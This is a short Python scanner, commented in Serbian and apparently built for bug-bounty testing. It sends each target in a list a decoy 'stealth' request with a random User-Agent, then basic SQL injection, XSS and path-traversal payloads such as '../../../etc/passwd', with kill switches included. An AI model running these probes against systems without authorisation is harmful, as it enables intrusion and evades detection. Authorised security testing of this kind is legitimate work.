# foxstrike_safe.py
import requests
import random
import time
import signal
import sys
import os

# ——— SIGINT prekid —————————————————————————————
def sigint_handler(sig, frame):
    print("\n[!] SIGINT detektovan – ShadowFox odmah staje.")
    sys.exit(0)
signal.signal(signal.SIGINT, sigint_handler)

# ——— Stealth priprema pre svakog payload-a —————————
def stealth_prepare(target_url):
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]),
        "Accept": "application/json",
        "H1-AUTH": "whitefox980"
    }
    harmless = ["/", "/about", "/contact", "/search?q=test", "/support"]
    url = target_url.rstrip("/") + random.choice(harmless)
    try:
        print(f"[STEALTH] Navigacija pre napada: {url}")
        requests.get(url, headers=headers, timeout=5)
        time.sleep(random.randint(2,5))
    except:
        print("[STEALTH] Ignorišem neuspeh pripreme…")
    return headers

# ——— Payload lista ——————————————————————————————
payloads = [
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "../../../etc/passwd"
]

# ——— Detekcija tipa ————————————————————————————
def detect_type(p):
    if "script" in p or "onerror" in p: return "XSS"
    if "OR '1" in p:            return "SQLi"
    if "../" in p or "passwd" in p: return "LFI"
    return "Other"

# ——— Glavna rutina po meti ————————————————————————
def run_shadowfox_on_target(target):
    print(f"\n[ShadowFox10 :: MISION START] {target}")
    for p in payloads:
        if os.path.exists("STOP_FOX"):
            print("[!] STOP_FOX flag – prekidam misiju.")
            sys.exit(0)
        hdr = stealth_prepare(target)
        full = f"{target}?q={p}"
        try:
            r = requests.get(full, headers=hdr, timeout=7)
            print(f"[{r.status_code} :: {detect_type(p)}] {full}")
        except Exception as e:
            print(f"[ERROR] {full} → {e}")

# ——— CLI pokretač ——————————————————————————————
if __name__ == "__main__":
    try:
        with open("targets.txt") as f:
            t = [l.strip() for l in f if l.strip()]
        for tgt in t:
            run_shadowfox_on_target(tgt)
    except KeyboardInterrupt:
        print("\n[!] CTRL+C uhvaćen – izlazim.")
        sys.exit(0)
    except FileNotFoundError:
        print("[ERROR] targets.txt nije pronađen.")
        sys.exit(1)
